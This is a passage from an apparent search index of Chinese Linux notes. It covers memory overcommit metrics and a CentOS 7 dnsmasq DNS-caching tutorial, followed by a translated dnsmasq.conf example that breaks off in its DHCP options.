Committed_AS\uff1a\u5f53\u524d\u5df2\u7ecf\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\u3002Committed_AS \u8868\u793a\u6240\u6709\u8fdb\u7a0b\u5df2\u7ecf\u7533\u8bf7\u7684\u5185\u5b58\u603b\u5927\u5c0f\uff0c\uff08\u6ce8\u610f\u662f\u5df2\u7ecf\u7533\u8bf7\u7684\uff0c\u4e0d\u662f\u5df2\u7ecf\u5206\u914d\u7684\uff09\uff0c\u5982\u679c Committed_AS \u8d85\u8fc7 CommitLimit \u5c31\u8868\u793a\u53d1\u751f\u4e86 overcommit\uff0c\u8d85\u51fa\u8d8a\u591a\u8868\u793a overcommit \u8d8a\u4e25\u91cd\u3002Committed_AS \u7684\u542b\u4e49\u6362\u4e00\u79cd\u8bf4\u6cd5\u5c31\u662f\uff0c\u5982\u679c\u8981\u7edd\u5bf9\u4fdd\u8bc1\u4e0d\u53d1\u751fOOM (out of memory) \u9700\u8981\u591a\u5c11\u7269\u7406\u5185\u5b58\u3002 sar -r \u662f\u67e5\u770b\u5185\u5b58\u4f7f\u7528\u72b6\u51b5\u7684\u5e38\u7528\u5de5\u5177\uff0c\u5b83\u7684\u8f93\u51fa\u7ed3\u679c\u4e2d\u6709\u4e24\u4e2a\u4e0eovercommit\u6709\u5173\uff0ckbcommit \u548c %commit\uff1a kbcommit\u5bf9\u5e94/proc/meminfo\u4e2d\u7684 Committed_AS\uff1b %commit\u7684\u8ba1\u7b97\u516c\u5f0f\u5e76\u6ca1\u6709\u91c7\u7528 CommitLimit\u4f5c\u5206\u6bcd\uff0c\u800c\u662fCommitted_AS/(MemTotal+SwapTotal)\uff0c\u610f\u601d\u662f_\u5185\u5b58\u7533\u8bf7_\u5360_\u7269\u7406\u5185\u5b58\u4e0e\u4ea4\u6362\u533a\u4e4b\u548c_\u7684\u767e\u5206\u6bd4\u3002 $ sar -r 05:00:01 PM kbmemfree kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty 05:10:01 PM 160576 3648460 95.78 0 1846212 4939368 62.74 1390292 1854880 4 \u7406\u89e3Linux\u7684memory overcommit | Linux Performance","title":"vm.overcommit_ratio \u53c2\u6570"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/DNS%E7%BC%93%E5%AD%98/","text":"\u5f53\u7f51\u7edc\u6761\u4ef6\u4e0d\u597d\u65f6\uff0c\u53ef\u4ee5\u8bbe\u7f6eDNS\u7f13\u5b58\u63d0\u9ad8DNS\u67e5\u8be2\u901f\u5ea6 \u5728 CentOS 7 \u4e0a\u8bbe\u7f6e DNS \u7f13\u5b58\u53ef\u4ee5\u901a\u8fc7\u5b89\u88c5\u548c\u914d\u7f6e\u540d\u4e3a dnsmasq \u7684\u670d\u52a1\u6765\u5b9e\u73b0\u3002 dnsmasq \u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684 DNS \u670d\u52a1\u5668\uff0c\u5b83\u53ef\u4ee5\u4e3a\u672c\u5730\u7cfb\u7edf\u63d0\u4f9b DNS \u7f13\u5b58\u529f\u80fd\uff0c\u4ece\u800c\u52a0\u5feb\u57df\u540d\u89e3\u6790\u901f\u5ea6\u5e76\u51cf\u5c11\u5bf9\u4e0a\u6e38 DNS \u670d\u52a1\u5668\u7684\u8bf7\u6c42\u3002\u4e0b\u9762\u662f\u5982\u4f55\u5728 CentOS 7 \u4e0a\u5b89\u88c5\u548c\u914d\u7f6e dnsmasq \u7684\u6b65\u9aa4\uff1a \u5b89\u88c5 dnsmasq \u6253\u5f00\u7ec8\u7aef\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5 dnsmasq \uff1a sudo yum install dnsmasq \u914d\u7f6e dnsmasq \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u7f16\u8f91 dnsmasq \u7684\u914d\u7f6e\u6587\u4ef6\u3002\u4f7f\u7528\u4f60\u559c\u6b22\u7684\u6587\u672c\u7f16\u8f91\u5668\u6253\u5f00 /etc/dnsmasq.conf \uff0c\u4f8b\u5982\uff1a sudo vi /etc/dnsmasq.conf \u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u6216\u4fee\u6539\u4ee5\u4e0b\u884c\u6765\u542f\u7528 DNS \u7f13\u5b58\uff1a # \u542f\u7528 DNS \u7f13\u5b58\u529f\u80fd cache-size=1000 # \u6dfb\u52a0\u6216\u53d6\u6d88\u6ce8\u91ca\u4ee5\u4e0b\u884c\u6765\u542f\u7528\u65e5\u5fd7\u8bb0\u5f55\uff1a log-queries log-facility=/var/log/dnsmasq.log # min-cache-ttl \uff1a\u8fd9\u4e2a\u8bbe\u7f6e\u6307\u5b9a\u4e86\u7f13\u5b58\u6761\u76ee\u7684\u6700\u5c0fTTL\u503c\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002\u5f53\u4ece\u4e0a\u6e38DNS\u670d\u52a1\u5668\u63a5\u6536\u5230\u7684TTL\u503c\u4f4e\u4e8e\u6b64\u8bbe\u7f6e\u65f6\uff0c`dnsmasq` \u4f1a\u81ea\u52a8\u5c06TTL\u8c03\u6574\u5230\u8fd9\u4e2a\u6700\u5c0f\u503c\u3002\u8fd9\u53ef\u4ee5\u9632\u6b62\u67d0\u4e9b\u52a8\u6001DNS\u914d\u7f6e\u8fc7\u4e8e\u9891\u7e41\u5730\u5bfc\u81f4\u7f13\u5b58\u5931\u6548\u3002 min-cache-ttl=300 # max-cache-ttl \uff1a\u8fd9\u4e2a\u8bbe\u7f6e\u6307\u5b9a\u4e86\u7f13\u5b58\u6761\u76ee\u7684\u6700\u5927TTL\u503c\u3002\u8fd9\u5bf9\u4e8e\u9650\u5236\u957f\u65f6\u95f4\u5b58\u50a8\u7f13\u5b58\u6761\u76ee\u7279\u522b\u6709\u7528\uff0c\u53ef\u4ee5\u9632\u6b62\u8fc7\u65f6\u7684DNS\u4fe1\u606f\u957f\u65f6\u95f4\u4fdd\u7559\u5728\u7f13\u5b58\u4e2d\u3002 max-cache-ttl=3600 \u8fd9\u91cc\u7684 cache-size=1000 \u8868\u793a\u7f13\u5b58\u5927\u5c0f\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8c03\u6574\u8fd9\u4e2a\u503c\u3002 \u8bbe\u7f6e dnsmasq \u4e3a\u7cfb\u7edf\u7684 DNS \u670d\u52a1 \u4e3a\u4e86\u8ba9\u7cfb\u7edf\u901a\u8fc7 dnsmasq \u89e3\u6790\u6240\u6709 DNS \u8bf7\u6c42\uff0c\u9700\u8981\u66f4\u6539\u7cfb\u7edf\u7684 DNS \u8bbe\u7f6e\u3002\u7f16\u8f91 /etc/resolv.conf \u6587\u4ef6\uff1a sudo vi /etc/resolv.conf \u4fee\u6539\u6216\u6dfb\u52a0\u4ee5\u4e0b\u884c\uff0c\u8bbe\u7f6e dnsmasq \u4f5c\u4e3a\u672c\u5730 DNS \u89e3\u6790\u5668\uff08\u786e\u4fdd\u8fd9\u662f\u6587\u4ef6\u4e2d\u7684\u7b2c\u4e00\u884c\uff09\uff1a nameserver 127.0.0.1 \u542f\u52a8 dnsmasq \u670d\u52a1 \u542f\u52a8 dnsmasq \u670d\u52a1\uff1a sudo systemctl start dnsmasq \u8bbe\u7f6e dnsmasq \u670d\u52a1\u5f00\u673a\u81ea\u542f\uff1a sudo systemctl enable dnsmasq \u6d4b\u8bd5\u914d\u7f6e \u4f7f\u7528 dig \u6216 nslookup \u547d\u4ee4\u6d4b\u8bd5 DNS \u89e3\u6790\u662f\u5426\u6b63\u5e38\uff1a dig example.com \u7b2c\u4e00\u6b21\u67e5\u8be2\u4f1a\u7a0d\u6162\uff0c\u56e0\u4e3a dnsmasq \u9700\u8981\u4ece\u4e0a\u6e38 DNS \u670d\u52a1\u5668\u83b7\u53d6\u6570\u636e\u5e76\u7f13\u5b58\u3002\u4e4b\u540e\u7684\u67e5\u8be2\u5e94\u8be5\u4f1a\u660e\u663e\u5feb\u5f88\u591a\uff0c\u56e0\u4e3a\u6570\u636e\u4f1a\u4ece\u672c\u5730\u7f13\u5b58\u4e2d\u83b7\u53d6\u3002 \u5982\u679c\u4ece\u7f13\u5b58\u4e2d\u67e5\u8be2\u5230\u4e86\u5730\u5740\uff0c\u90a3\u4e48\u5c31\u4f1a\u7f13\u5b58\u88ab\u547d\u4e2d # sudo grep \"cached\" /var/log/dnsmasq.log Apr 28 19:08:54 dnsmasq[4061579]: cached www.baidu.com is <CNAME> \u8fd9\u6837\uff0c\u4f60\u5c31\u6210\u529f\u5728 CentOS 7 \u7cfb\u7edf\u4e0a\u8bbe\u7f6e\u4e86 DNS \u7f13\u5b58\uff0c\u5e94\u8be5\u80fd\u6709\u6548\u63d0\u9ad8\u57df\u540d\u89e3\u6790\u7684\u901f\u5ea6\u548c\u6548\u7387\u3002\u5982\u679c\u4f60\u9047\u5230\u4efb\u4f55\u95ee\u9898\uff0c\u53ef\u4ee5\u91cd\u67e5\u914d\u7f6e\u6216\u68c0\u67e5 dnsmasq \u7684\u72b6\u6001\u548c\u65e5\u5fd7\u4ee5\u786e\u4fdd\u4e00\u5207\u6b63\u5e38\u8fd0\u884c\u3002 \u4e0b\u9762\u662f dnsmasq \u914d\u7f6e\u6587\u4ef6\u7684\u683c\u5f0f\u4fdd\u6301\u4e0d\u53d8\u7684\u7ffb\u8bd1\uff1a # dnsmasq\u7684\u914d\u7f6e\u6587\u4ef6\u3002 # # \u683c\u5f0f\u4e3a\u6bcf\u884c\u4e00\u4e2a\u9009\u9879\uff0c\u6709\u6548\u9009\u9879\u4e0e\u547d\u4ee4\u884c\u4e0a\u7684\u957f\u9009\u9879\u76f8\u540c\u3002\u8be6\u60c5\u89c1 # \"/usr/sbin/dnsmasq --help\" \u6216 \"man 8 dnsmasq\"\u3002 # \u5728\u6807\u51c6DNS\u7aef\u53e3\uff0853\uff09\u4e4b\u5916\u7684\u7279\u5b9a\u7aef\u53e3\u4e0a\u76d1\u542c # \uff0853\uff09\u3002\u5c06\u6b64\u8bbe\u7f6e\u4e3a\u96f6\u4f1a\u5b8c\u5168\u7981\u7528DNS\u529f\u80fd\uff0c # \u4ec5\u7559\u4e0bDHCP\u548c/\u6216TFTP\u3002 #port=5353 # \u4e0b\u9762\u4e24\u4e2a\u9009\u9879\u4f7f\u4f60\u6210\u4e3a\u4e00\u4e2a\u66f4\u597d\u7684\u7f51\u7edc\u516c\u6c11\uff0c\u56e0\u4e3a\u5b83\u4eec # \u544a\u8bc9dnsmasq\u8fc7\u6ee4\u6389\u516c\u5171DNS\u65e0\u6cd5\u56de\u7b54\u7684\u67e5\u8be2\uff0c # \u5e76\u4e14\u4e0d\u5fc5\u8981\u5730\u52a0\u8f7d\u670d\u52a1\u5668\uff08\u5c24\u5176\u662f\u6839\u670d\u52a1\u5668\uff09\u3002 # \u5982\u679c\u4f60\u6709\u6309\u9700\u62e8\u53f7\u8fde\u63a5\uff0c\u5b83\u4eec\u8fd8\u80fd\u963b\u6b62 # \u8fd9\u4e9b\u8bf7\u6c42\u4e0d\u5fc5\u8981\u5730\u5efa\u7acb\u8fde\u63a5\u3002 # \u4ece\u4e0d\u8f6c\u53d1\u6ca1\u6709\u70b9\u6216\u57df\u90e8\u5206\u7684\u7eaf\u540d\u79f0 #domain-needed # \u4ece\u4e0d\u8f6c\u53d1\u975e\u8def\u7531\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u5730\u5740\u3002 #bogus-priv # \u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e9b\u4ee5\u542f\u7528DNSSEC\u9a8c\u8bc1\u548c\u7f13\u5b58\uff1a # (\u9700\u8981dnsmasq\u7f16\u8bd1\u65f6\u5305\u542bDNSSEC\u9009\u9879\u3002) #conf-file=/usr/share/dnsmasq/trust-anchors.conf #dnssec # \u6ca1\u6709DNSSEC\u7b7e\u540d\u7684\u56de\u590d\u53ef\u80fd\u662f\u5408\u6cd5\u7684\uff0c\u56e0\u4e3a\u8be5\u57df # \u672a\u7b7e\u540d\uff0c\u6216\u53ef\u80fd\u662f\u4f2a\u9020\u7684\u3002\u8bbe\u7f6e\u6b64\u9009\u9879\u544a\u8bc9dnsmasq # \u68c0\u67e5\u672a\u7b7e\u540d\u56de\u590d\u662f\u5426\u53ef\u4ee5\u63a5\u53d7\uff0c\u65b9\u6cd5\u662f\u627e\u5230\u4e00\u4e2a\u5b89\u5168\u8bc1\u660e # \u8868\u660e\u4ece\u6839\u5230\u8be5\u57df\u4e4b\u95f4\u67d0\u5904\u7684DS\u8bb0\u5f55\u4e0d\u5b58\u5728\u3002 # \u8bbe\u7f6e\u6b64\u9879\u7684\u4ee3\u4ef7\u662f\u5373\u4f7f\u5728\u672a\u7b7e\u540d\u7684\u57df\u4e2d\u7684\u67e5\u8be2\u4e5f\u9700\u8981 # \u4e00\u4e2a\u6216\u591a\u4e2a\u989d\u5916\u7684DNS\u67e5\u8be2\u6765\u9a8c\u8bc1\u3002 #dnssec-check-unsigned # \u53d6\u6d88\u6ce8\u91ca\u6b64\u9879\u4ee5\u8fc7\u6ee4\u65e0\u7528\u7684Windows\u8d77\u6e90DNS\u8bf7\u6c42 # \u8fd9\u53ef\u80fd\u65e0\u7f18\u65e0\u6545\u89e6\u53d1\u6309\u9700\u8fde\u63a5\u3002 # \u6ce8\u610f\u8fd9\uff08\u5728\u5176\u4ed6\u4e8b\u9879\u4e2d\uff09\u4f1a\u963b\u585e\u6240\u6709SRV\u8bf7\u6c42\uff0c # \u56e0\u6b64\u5982\u679c\u4f60\u4f7f\u7528\u4f8b\u5982Kerberos, SIP, XMPP\u6216Google-talk\uff0c # \u5219\u4e0d\u8981\u4f7f\u7528\u5b83\u3002 # \u8fd9\u4e2a\u9009\u9879\u4ec5\u5f71\u54cd\u8f6c\u53d1\uff0cSRV\u8bb0\u5f55\u7531 # dnsmasq\uff08\u901a\u8fc7srv-host=\u884c\uff09\u4ea7\u751f\u7684\u4e0d\u53d7\u5176\u5f71\u54cd\u3002 #filterwin2k # \u5982\u679c\u4f60\u5e0c\u671bdns\u4ece\u5176\u4ed6\u5730\u65b9\u83b7\u53d6\u5176\u4e0a\u6e38\u670d\u52a1\u5668 # \u800c\u4e0d\u662f/etc/resolv.conf #resolv-file= # \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cdnsmasq\u4f1a\u5411\u5b83\u6240\u77e5\u9053\u7684\u4efb\u4f55\u4e0a\u6e38 # \u670d\u52a1\u5668\u53d1\u9001\u67e5\u8be2\uff0c\u5e76\u5c1d\u8bd5\u4f18\u5148\u8003\u8651\u5df2\u77e5\u7684 # \u8fd0\u884c\u4e2d\u7684\u670d\u52a1\u5668\u3002\u53d6\u6d88\u6ce8\u91ca\u6b64\u9879\u5f3a\u5236dnsmasq # \u5c1d\u8bd5\u6309/etc/resolv.conf\u4e2d\u51fa\u73b0\u7684\u987a\u5e8f # \u4e25\u683c\u5730\u5bf9\u6bcf\u4e2a\u67e5\u8be2\u7684\u6bcf\u4e2a\u670d\u52a1\u5668\u8fdb\u884c\u5c1d\u8bd5\u3002 #strict-order # \u5982\u679c\u4f60\u4e0d\u5e0c\u671bdnsmasq\u8bfb\u53d6/etc/resolv.conf\u6216\u4efb\u4f55\u5176\u4ed6 # \u6587\u4ef6\uff0c\u800c\u662f\u4ece\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u83b7\u53d6\u5176\u670d\u52a1\u5668\uff08\u89c1\u4e0b\u6587\uff09\uff0c\u90a3\u4e48 # \u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e00\u884c\u3002 #no-resolv # \u5982\u679c\u4f60\u4e0d\u5e0c\u671bdnsmasq\u8f6e\u8be2/etc/resolv.conf\u6216\u5176\u4ed6\u89e3\u6790 # \u6587\u4ef6\u7684\u53d8\u5316\u5e76\u91cd\u65b0\u8bfb\u53d6\u5b83\u4eec\uff0c\u90a3\u4e48\u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e00\u884c\u3002 #no-poll # \u5728\u8fd9\u91cc\u6dfb\u52a0\u5176\u4ed6\u540d\u79f0\u670d\u52a1\u5668\uff0c\u5e26\u6709\u57df\u89c4\u8303\uff0c\u5982\u679c\u5b83\u4eec\u662f\u4e3a # \u975e\u516c\u5171\u57df\u3002 #server=/localnet/192.168.0.1 # \u4f8b\u5b50\uff0c\u5c06PTR\u67e5\u8be2\u8def\u7531\u5230\u540d\u79f0\u670d\u52a1\u5668\uff1a\u8fd9\u4f1a\u53d1\u9001\u6240\u6709 # \u5730\u5740->\u540d\u79f0\u67e5\u8be2192.168.3/24\u5230\u540d\u79f0\u670d\u52a1\u566810.1.2.3 #server=/3.168.192.in-addr.arpa/10.1.2.3 # \u5728\u8fd9\u91cc\u6dfb\u52a0\u4ec5\u672c\u5730\u57df\uff0c\u8fd9\u4e9b\u57df\u7684\u67e5\u8be2 # \u4ece/etc/hosts\u6216DHCP\u4ec5\u56de\u7b54\u67e5\u8be2\u3002 #local=/localnet/ # \u5728\u8fd9\u91cc\u6dfb\u52a0\u4f60\u60f3\u8981\u5f3a\u5236\u8f6c\u5230IP\u5730\u5740\u7684\u57df\u3002 # \u4e0b\u9762\u7684\u4f8b\u5b50\u628adouble-click.net\u7684\u4efb\u4f55\u4e3b\u673a\u90fd\u53d1\u9001\u5230\u4e00\u4e2a\u672c\u5730 # web-server\u3002 #address=/double-click.net/127.0.0.1 # --address (\u548c --server) \u4e5f\u9002\u7528\u4e8eIPv6\u5730\u5740\u3002 #address=/www.thekelleys.org.uk/fe80::20d:60ff:fe36:f83 # \u5c06yahoo.com, google.com\u53ca\u5176\u5b50\u57df\u7684\u6240\u6709\u67e5\u8be2IP # \u6dfb\u52a0\u5230vpn\u548csearch ipsets: #ipset=/yahoo.com/google.com/vpn,search # \u4f60\u53ef\u4ee5\u63a7\u5236dnsmasq\u5982\u4f55\u4e0e\u670d\u52a1\u5668\u5bf9\u8bdd\uff1a\u8fd9\u5f3a\u5236 # \u901a\u8fc7eth1\u8def\u7531\u523010.1.2.3\u7684\u67e5\u8be2 # server=10.1.2.3@eth1 # \u8fd9\u5c06\u8bbe\u7f6e\u4e0e10.1.2.3\u901a\u8bdd\u7684\u6e90\uff08\u5373\u672c\u5730\uff09\u5730\u5740 # \u4e3a192.168.1.1 \u7aef\u53e3 55\uff08\u663e\u7136\uff0c\u673a\u5668\u4e0a\u5fc5\u987b\u6709\u4e00\u4e2a # \u8be5IP\u7684\u63a5\u53e3\uff09\u3002 # server=10.1.2.3@192.168.1.1#55 # \u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u66f4\u6539\u542f\u52a8\u540e\u7684uid\u548cgid # \u4e3a\u5176\u4ed6\u9ed8\u8ba4\u503c\uff0c\u8bf7\u7f16\u8f91\u4ee5\u4e0b\u884c\u3002 user=dnsmasq group=dnsmasq # \u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u4ec5\u5728\u6307\u5b9a\u7684\u63a5\u53e3\u4e0a\u76d1\u542c # DHCP\u548cDNS\u8bf7\u6c42\uff08\u548cloopback\uff09\uff0c\u8bf7\u5728\u8fd9\u91cc\u7ed9\u51fa # \u63a5\u53e3\u7684\u540d\u79f0\uff08\u4f8b\u5982eth0\uff09\u3002 # \u91cd\u590d\u8be5\u884c\u4ee5\u5305\u62ec\u591a\u4e2a\u63a5\u53e3\u3002 #interface= # \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4ec5\u5728localhost\u4e0a\u76d1\u542c interface=lo # \u6216\u8005\u4f60\u53ef\u4ee5\u6307\u5b9a_\u4e0d_\u76d1\u542c\u7684\u63a5\u53e3 #except-interface= # \u6216\u8005\u901a\u8fc7\u5730\u5740\u6307\u5b9a\u76d1\u542c\u7684\u63a5\u53e3\uff08\u8bb0\u4f4f\u5305\u62ec127.0.0.1 # \u5982\u679c\u4f60\u4f7f\u7528\u8fd9\u4e2a\u3002\uff09 #listen-address= # \u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u4ec5\u5728\u4e00\u4e2a\u63a5\u53e3\u4e0a\u63d0\u4f9bDNS\u670d\u52a1\uff0c # \u5982\u4e0a\u6240\u793a\u914d\u7f6e\u5b83\uff0c\u7136\u540e\u4f7f\u7528\u4ee5\u4e0b\u884c\u6765 # \u7981\u7528\u5176\u4e0a\u7684DHCP\u548cTFTP\u3002 #no-dhcp-interface= # \u4ec5\u4e3a\u76f4\u63a5\u8fde\u63a5\u5230\u672c\u673a\u7684\u7f51\u7edc\u63d0\u4f9bDNS\u548cDHCP\u670d\u52a1\u3002 # \u4efb\u4f55interface=\u884c\u5c06\u8986\u76d6\u5b83\u3002 #local-service # \u5728\u652f\u6301\u7684\u7cfb\u7edf\u4e0a\uff0cdnsmasq\u7ed1\u5b9a\u901a\u914d\u5730\u5740\uff0c # \u5373\u4f7f\u5b83\u53ea\u76d1\u542c\u67d0\u4e9b\u63a5\u53e3\u3002\u7136\u540e\u5b83\u4e22\u5f03 # \u4e0d\u5e94\u7b54\u590d\u7684\u8bf7\u6c42\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f # \u5373\u4f7f\u63a5\u53e3\u6765\u6765\u53bb\u53bb\u4e14\u66f4\u6539\u5730\u5740\u4e5f\u80fd\u5de5\u4f5c\u3002\u5982\u679c\u4f60 # \u5e0c\u671bdnsmasq\u771f\u6b63\u53ea\u7ed1\u5b9a\u5b83\u6b63\u5728\u76d1\u542c\u7684\u63a5\u53e3\uff0c # \u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e2a\u9009\u9879\u3002\u5927\u7ea6\u552f\u4e00\u9700\u8981\u8fd9\u4e2a\u7684\u65f6\u5019\u662f\u5f53 # \u540c\u4e00\u53f0\u673a\u5668\u4e0a\u8fd0\u884c\u53e6\u4e00\u4e2a\u540d\u79f0\u670d\u52a1\u5668\u3002 # # \u8981\u53ea\u5728localhost\u4e0a\u76d1\u542c\u5e76\u4e0d\u63a5\u6536\u5176\u4ed6 # \u63a5\u53e3\u7684\u6570\u636e\u5305\uff0c\u8bf7\u4ec5\u7ed1\u5b9a\u5230lo\u8bbe\u5907\u3002\u6ce8\u91ca\u6389\u4ee5\u5728\u5355\u4e2a # \u901a\u914d\u7b26\u5957\u63a5\u5b57\u4e0a\u7ed1\u5b9a\u3002 bind-interfaces # \u5982\u679c\u4f60\u4e0d\u5e0c\u671bdnsmasq\u8bfb\u53d6/etc/hosts\uff0c\u53d6\u6d88\u6ce8\u91ca # \u4e0b\u9762\u8fd9\u884c\u3002 #no-hosts # \u6216\u8005\u5982\u679c\u4f60\u5e0c\u671b\u5b83\u8bfb\u53d6\u53e6\u4e00\u4e2a\u6587\u4ef6\u4ee5\u53ca/etc/hosts\uff0c\u4f7f\u7528 # \u8fd9\u4e2a\u3002 #addn-hosts=/etc/banner_add_hosts # \u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u81ea\u52a8\u5c06\u57df\u6dfb\u52a0\u5230hosts-file\u4e2d\u7684\u7b80\u5355\u540d\u79f0\u4e2d\uff0c # \u8bbe\u7f6e\u6b64\u9879\uff08\u548cdomain: \u89c1\u4e0b\u6587\uff09\u3002 #expand-hosts # \u4e3adnsmasq\u8bbe\u7f6e\u57df\u3002\u8fd9\u662f\u53ef\u9009\u7684\uff0c\u4f46\u5982\u679c\u8bbe\u7f6e\uff0c # \u5b83\u5c06\u505a\u4ee5\u4e0b\u51e0\u4ef6\u4e8b\u60c5\u3002 # 1) \u5141\u8bb8DHCP\u4e3b\u673a\u62e5\u6709\u5b8c\u5168\u5408\u683c\u7684\u57df\u540d\uff0c\u53ea\u8981\u57df\u90e8\u5206\u4e0e\u6b64\u8bbe\u7f6e\u5339\u914d\u3002 # 2) \u8bbe\u7f6e\u201c\u57df\u201dDHCP\u9009\u9879\uff0c\u4ece\u7eed\u800c\u6f5c\u5728\u5730\u8bbe\u7f6e\u6240\u6709\u901a\u8fc7DHCP\u914d\u7f6e\u7684\u7cfb\u7edf\u7684\u57df # 3) \u4e3a\u201cexpand-hosts\u201d\u63d0\u4f9b\u57df\u90e8\u5206 #domain=thekelleys.org.uk # \u4e3a\u7279\u5b9a\u5b50\u7f51\u8bbe\u7f6e\u4e0d\u540c\u7684\u57df #domain=wireless.thekelleys.org.uk,192.168.2.0/24 # \u540c\u6837\u7684\u6982\u5ff5\uff0c\u4f46\u4f7f\u7528\u8303\u56f4\u800c\u4e0d\u662f\u5b50\u7f51 #domain=reserved.thekelleys.org.uk,192.68.3.100,192.168.3.200 # \u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e2a\u4ee5\u542f\u7528\u96c6\u6210\u7684DHCP\u670d\u52a1\u5668\uff0c\u4f60\u9700\u8981 # \u63d0\u4f9b\u53ef\u4f9b\u79df\u8d41\u7684\u5730\u5740\u8303\u56f4\uff0c\u4ee5\u53ca\u53ef\u9009\u7684 # \u79df\u8d41\u65f6\u95f4\u3002\u5982\u679c\u4f60\u6709\u591a\u4e2a\u7f51\u7edc\uff0c\u4f60\u5c06\u9700\u8981 # \u4e3a\u6bcf\u4e2a\u7f51\u7edc\u91cd\u590d\u8fd9\u4e00\u8bbe\u7f6e\u4ee5\u63d0\u4f9bDHCP\u670d\u52a1\u3002 #dhcp-range=192.168.0.50,192.168.0.150,12h # \u8fd9\u662f\u4e00\u4e2aDHCP\u8303\u56f4\u7684\u793a\u4f8b\uff0c\u5176\u4e2d\u7ed9\u51fa\u4e86\u5b50\u7f51\u63a9\u7801\u3002\u8fd9\u662f # \u9700\u8981\u901a\u8fc7\u4e2d\u7ee7\u4ee3\u7406\u5230\u8fbednsmasq DHCP\u670d\u52a1\u5668\u7684\u7f51\u7edc\u6240\u9700\u7684\u3002 # \u5982\u679c\u4f60\u4e0d\u77e5\u9053DHCP\u4e2d\u7ee7\u4ee3\u7406\u662f\u4ec0\u4e48\uff0c\u4f60\u53ef\u80fd # \u4e0d\u9700\u8981\u62c5\u5fc3\u8fd9\u4e2a\u3002 #dhcp-range=192.168.0.50,192.168.0.150,255.255.255.0,12h # \u8fd9\u662f\u4e00\u4e2a\u8bbe\u7f6e\u4e86\u6807\u7b7e\u7684DHCP\u8303\u56f4\u7684\u793a\u4f8b\uff0c # \u56e0\u6b64\u67d0\u4e9bDHCP\u9009\u9879\u53ef\u80fd\u53ea\u4e3a\u8fd9\u4e2a\u7f51\u7edc\u8bbe\u7f6e\u3002 #dhcp-range=set:red,192.168.0.50,192.168.0.150 # \u5f53\u6807\u7b7e\"green\"\u88ab\u8bbe\u7f6e\u65f6\uff0c\u4f7f\u7528\u8fd9\u4e2aDHCP\u8303\u56f4\u3002 #dhcp-range=tag:green,192.168.0.50,192.168.0.150,12h # \u6307\u5b9a\u4e00\u4e2a\u5b50\u7f51\u4e0d\u80fd\u7528\u4e8e\u52a8\u6001\u5730\u5740\u5206\u914d\uff0c # \u4ec5\u4e3a\u4e0e--dhcp-host\u884c\u5339\u914d\u7684\u4e3b\u673a\u53ef\u7528\u3002\u6ce8\u610f # \u9664\u975e\u6709\u67d0\u79cd\u7c7b\u578b\u7684dhcp-range\u4e3a\u8be5\u5b50\u7f51\uff0c # \u5426\u5219dhcp-host\u58f0\u660e\u5c06\u88ab\u5ffd\u7565\u3002 # \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5b50\u7f51\u63a9\u7801\u662f\u9690\u542b\u7684\uff08\u5b83\u6765\u81ea # \u8fd0\u884cdnsmasq\u7684\u673a\u5668\u4e0a\u7684\u7f51\u7edc\u914d\u7f6e\uff09\uff0c\u53ef\u4ee5\u6307\u5b9a # \u4e00\u4e2a\u660e\u786e\u7684\u5b50\u7f51\u63a9\u7801\u3002 #dhcp-range=192.168.0.0,static # \u542f\u7528DHCPv6\u3002\u6ce8\u610f\u4e0d\u9700\u8981\u6307\u5b9a\u524d\u7f00\u957f\u5ea6 # \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5982\u679c\u7f3a\u5931\u5219\u4e3a64\u3002 #dhcp-range=1234::2, 1234::500, 64, 12h # \u8fdb\u884c\u8def\u7531\u901a\u544a\uff0c\u4f46\u4e0d\u4e3a\u8fd9\u4e2a\u5b50\u7f51\u505aDHCP\u3002 #dhcp-range=1234::, ra-only # \u8fdb\u884c\u8def\u7531\u901a\u544a\uff0c\u4f46\u4e0d\u4e3a\u8fd9\u4e2a\u5b50\u7f51\u505aDHCP\uff0c\u540c\u65f6\u5c1d\u8bd5 # \u4e3aSLAAC\u914d\u7f6e\u7684\u53cc\u6808\u4e3b\u673a\u7684IPv6\u5730\u5740\u6dfb\u52a0\u540d\u79f0\u3002 # \u4f7f\u7528DHCPv4\u79df\u7ea6\u6765\u63a8\u5bfc\u540d\u79f0\uff0c\u7f51\u7edc\u6bb5\u548c # MAC\u5730\u5740\uff0c\u5e76\u5047\u8bbe\u8be5\u4e3b\u673a\u4e5f\u4f1a\u6709\u4e00\u4e2a # \u4f7f\u7528SLAAC\u7b97\u6cd5\u8ba1\u7b97\u7684IPv6\u5730\u5740\u3002 #dhcp-range=1234::, ra-names # \u8fdb\u884c\u8def\u7531\u901a\u544a\uff0c\u4f46\u4e0d\u4e3a\u8fd9\u4e2a\u5b50\u7f51\u505aDHCP\u3002 # \u8bbe\u7f6e\u751f\u547d\u5468\u671f\u4e3a46\u5c0f\u65f6\u3002\uff08\u6ce8\u610f\uff1a\u6700\u5c0f\u751f\u547d\u5468\u671f\u4e3a2\u5c0f\u65f6\u3002\uff09 #dhcp-range=1234::, ra-only, 48h # \u4e3a\u8fd9\u4e2a\u5b50\u7f51\u505aDHCP\u548c\u8def\u7531\u901a\u544a\u3002\u5728RA\u4e2d\u8bbe\u7f6eA\u4f4d\uff0c # 